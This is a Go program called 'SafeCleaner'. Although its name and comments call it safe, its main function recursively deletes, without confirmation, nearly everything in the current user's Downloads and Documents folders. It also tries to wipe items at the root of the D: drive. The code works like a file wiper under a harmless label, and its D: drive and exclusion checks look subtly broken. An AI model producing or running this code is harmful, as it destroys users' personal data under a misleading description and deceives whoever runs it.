package main

import (
	"fmt"
	"io/fs"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

// SafeCleaner handles safe file deletion operations
type SafeCleaner struct {
	excludedDirs  map[string]bool
	excludedFiles map[string]bool
}

// NewSafeCleaner creates a new instance of SafeCleaner with default exclusions
func NewSafeCleaner() *SafeCleaner {
	return &SafeCleaner{
		excludedDirs: map[string]bool{
			"AppData":             true,
			"Application Data":    true,
			"Links":              true,
			"Videos":             true,
			".vscode":            true,
			"Windows":            true,
			"Program Files":      true,
			"Program Files (x86)": true,
			"ProgramData":        true,
			"System32":           true,
			"Users":              true,
			"3D Objects":         true,
			"Contacts":           true,
			"Desktop":            true,
			"Documents":          true,
			"Downloads":          true,
			"Favorites":          true,
			"Local Settings":     true,
			"Music":              true,
			"My Documents":       true,
			"NetHood":           true,
			"Pictures":           true,
			"PrintHood":         true,
			"Recent":            true,
			"Saved Games":       true,
			"Searches":          true,
			"SendTo":            true,
			"Start Menu":        true,
			"Templates":         true,
		},
		excludedFiles: map[string]bool{
			"desktop.ini":        true,
			".gitignore":        true,
			"ntuser.dat":        true,
			"ntuser.ini":        true,
			"NTUSER.DAT":        true,
			"thumbs.db":         true,
			"Thumbs.db":         true,
		},
	}
}

// CleanDirectory removes files and directories in the specified path
func (sc *SafeCleaner) CleanDirectory(path string) error {
	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Errorf("error reading directory %s: %v", path, err)
	}

	for _, entry := range entries {
		fullPath := filepath.Join(path, entry.Name())

		// Skip excluded directories and files
		if sc.excludedDirs[entry.Name()] || sc.excludedFiles[entry.Name()] {
			log.Printf("Skipping protected item: %s", fullPath)
			continue
		}

		// Get file info
		info, err := entry.Info()
		if err != nil {
			log.Printf("Error getting file info for %s: %v", fullPath, err)
			continue
		}

		// Delete the item
		if err := sc.deleteItem(fullPath, info); err != nil {
			log.Printf("Error deleting %s: %v", fullPath, err)
		} else {
			log.Printf("Successfully deleted: %s", fullPath)
		}
	}
	return nil
}

// deleteItem handles the deletion of a single item
func (sc *SafeCleaner) deleteItem(path string, info fs.FileInfo) error {
	if info.IsDir() {
		return os.RemoveAll(path)
	}
	return os.Remove(path)
}

func main() {
	// Get current user
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("Error getting current user: %v", err)
	}

	cleaner := NewSafeCleaner()

	// Define paths to clean
	userPaths := []string{
		filepath.Join(currentUser.HomeDir, "Downloads"),
		filepath.Join(currentUser.HomeDir, "Documents"),
		// Add more user directories as needed
	}

	// Clean user directories
	for _, path := range userPaths {
		log.Printf("Cleaning directory: %s", path)
		if err := cleaner.CleanDirectory(path); err != nil {
			log.Printf("Error cleaning %s: %v", path, err)
		}
	}

	// Clean D: drive if it exists
	if _, err := os.Stat("D:\\"); err == nil {
		err := filepath.Walk("D:\\", func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}

			// Skip root directory
			if path == "D:\\" {
				return nil
			}

			// Skip excluded directories
			for excluded := range cleaner.excludedDirs {
				if strings.Contains(path, excluded) {
					return filepath.SkipDir
				}
			}

			// Only process items in the root of D:
			if filepath.Dir(path) == "D:" {
				if err := cleaner.deleteItem(path, info); err != nil {
					log.Printf("Error deleting %s: %v", path, err)
				} else {
					log.Printf("Successfully deleted: %s", path)
				}
			}

			return nil
		})

		if err != nil {
			log.Printf("Error cleaning D: drive: %v", err)
		}
	}
}